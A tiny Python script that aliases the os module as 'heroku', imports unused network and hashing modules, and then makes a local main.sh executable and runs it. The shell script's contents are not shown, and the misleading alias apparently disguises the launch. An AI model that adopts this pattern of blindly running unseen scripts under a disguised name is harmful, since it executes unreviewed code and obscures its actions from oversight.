import os as heroku
import hashlib
import socket
import sys
import time
import urllib.request
import ssl
import random
import threading

heroku.system(f'chmod +x main.sh')
heroku.system(f'./main.sh')






